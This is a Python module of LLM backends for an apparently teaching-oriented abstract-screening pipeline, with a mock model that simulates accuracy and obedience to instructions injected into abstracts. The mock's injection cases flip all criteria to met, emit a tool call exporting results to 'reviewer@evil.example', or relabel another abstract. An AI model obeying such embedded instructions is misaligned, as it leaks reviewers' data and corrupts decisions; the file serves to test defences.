"""LLM backends.

OllamaLLM  real local model (qwen2.5:7b-instruct by default) via the Ollama HTTP API.
MockLLM    simulated reader with documented error rates, so the whole pipeline,
           the tests and the analysis can run offline. Mock numbers are for
           teaching and pipeline checks only: never cite them as research results.

Every agent builds a real prompt (the same prompt the Ollama backend sends), so token
counts are comparable across backends. The mock also receives a `ctx` dict with the
structured inputs it needs to simulate reading.
"""
from __future__ import annotations

import json
import random
import urllib.request
from dataclasses import dataclass


@dataclass
class LLMResult:
    data: dict
    prompt_tokens: int
    completion_tokens: int
    raw: str = ""


def approx_tokens(text: str) -> int:
    return max(1, len(text) // 4)


# ------------------------------------------------------------------ mock model
class MockLLM:
    # accuracy of judging one criterion, by phrase clarity
    ACC = {
        "single":   {"explicit": 0.96, "subtle": 0.78},   # one call judges everything at once
        "stepwise": {"explicit": 0.97, "subtle": 0.82},   # ReAct screener: criterion by criterion
        "critic":   {"explicit": 0.97, "subtle": 0.84},   # critic with a per-criterion rubric
    }
    EXAMPLE_BOOST = 0.10      # subtle accuracy gain when a retrieved example shows the same phrasing
    CRITIC_ECHO = 0.40        # chance the critic simply agrees with the screener (shared blind spot)
    COMPLY = {"unguarded": 0.45, "guarded": 0.30}   # chance of obeying an embedded instruction

    def __init__(self, seed: int = 0):
        self.seed = seed
        self.name = "mock"

    def _rng(self, *salt):
        return random.Random("|".join(map(str, (self.seed,) + salt)))

    def _judge(self, rng, crit, mode, examples):
        acc = self.ACC[mode][crit["clarity"]]
        if crit["clarity"] == "subtle" and any(crit["phrase"] in e["text"] for e in examples or []):
            acc = min(0.95, acc + self.EXAMPLE_BOOST)
        correct = rng.random() < acc
        met = crit["met"] if correct else not crit["met"]
        if correct:
            conf = rng.uniform(0.85, 0.98) if crit["clarity"] == "explicit" else rng.uniform(0.55, 0.92)
        else:
            conf = rng.uniform(0.5, 0.85)
        return met, round(conf, 2)

    def _complies(self, rng, a, guarded):
        if not a.injection:
            return False
        return rng.random() < self.COMPLY["guarded" if guarded else "unguarded"]

    def run(self, role: str, prompt: str, ctx: dict) -> LLMResult:
        a = ctx["abstract"]
        rng = self._rng(role, a.id, ctx.get("salt", ""))
        guarded = ctx.get("guarded", False)
        examples = ctx.get("examples") or []
        out = {"criteria": {}, "actions": []}
        if role in ("single", "stepwise"):
            for c in "PIOS":
                met, conf = self._judge(rng, a.criteria[c], role, examples)
                out["criteria"][c] = {"met": met, "confidence": conf}
            if self._complies(rng, a, guarded):
                if a.injection == "flip":
                    out["criteria"] = {c: {"met": True, "confidence": 0.97} for c in "PIOS"}
                elif role == "stepwise" and a.injection == "export":
                    out["actions"].append({"tool": "export_results", "args": {"to": "reviewer@evil.example"}})
                elif role == "stepwise" and a.injection == "tamper":
                    out["actions"].append({"tool": "record_decision",
                                           "args": {"abstract_id": ctx.get("victim_id", "A999"), "label": "exclude"}})
            if role == "single":
                out["label"] = "include" if all(v["met"] for v in out["criteria"].values()) else "exclude"
        elif role == "critic":
            prev = ctx["screener"]
            for c in "PIOS":
                if rng.random() < self.CRITIC_ECHO:
                    out["criteria"][c] = dict(prev[c])
                else:
                    met, conf = self._judge(rng, a.criteria[c], "critic", [])
                    out["criteria"][c] = {"met": met, "confidence": conf}
            if self._complies(rng, a, guarded) and a.injection == "flip":
                out["criteria"] = {c: {"met": True, "confidence": 0.95} for c in "PIOS"}
        else:
            raise ValueError(role)
        raw = json.dumps(out)
        return LLMResult(out, approx_tokens(prompt), approx_tokens(raw) + (120 if role != "single" else 40), raw)


# ---------------------------------------------------------------- real model
class OllamaLLM:
    """Calls a local model through Ollama. Requires `ollama serve` and `ollama pull <model>`.
    Not exercised in the offline test run; see README for how to switch."""

    def __init__(self, model="qwen2.5:7b-instruct", host="http://localhost:11434", temperature=0.7, seed=0):
        self.model, self.host, self.temperature, self.seed = model, host, temperature, seed
        self.name = model

    def run(self, role: str, prompt: str, ctx: dict) -> LLMResult:
        body = {
            "model": self.model,
            "messages": [{"role": "system", "content": ctx.get("system", "Reply with JSON only.")},
                         {"role": "user", "content": prompt}],
            "format": "json",
            "stream": False,
            "options": {"temperature": self.temperature, "seed": self.seed},
        }
        req = urllib.request.Request(f"{self.host}/api/chat", data=json.dumps(body).encode(),
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=300) as r:
            resp = json.loads(r.read())
        raw = resp["message"]["content"]
        try:
            data = json.loads(raw)
        except json.JSONDecodeError:
            data = {}
        data = _normalise(data, role)
        return LLMResult(data, resp.get("prompt_eval_count", approx_tokens(prompt)),
                         resp.get("eval_count", approx_tokens(raw)), raw)


def _normalise(data: dict, role: str) -> dict:
    """Make model output safe to consume: missing criteria count as 'not met, low confidence'."""
    crit = data.get("criteria") or {}
    out = {"criteria": {}, "actions": []}
    for c in "PIOS":
        v = crit.get(c) or {}
        out["criteria"][c] = {"met": bool(v.get("met", False)),
                              "confidence": float(v.get("confidence", 0.5) or 0.5),
                              "evidence": str(v.get("evidence", ""))[:300]}
    acts = data.get("actions") or []
    out["actions"] = [a for a in acts if isinstance(a, dict) and "tool" in a][:3]
    if role == "single":
        out["label"] = "include" if all(v["met"] for v in out["criteria"].values()) else "exclude"
    return out
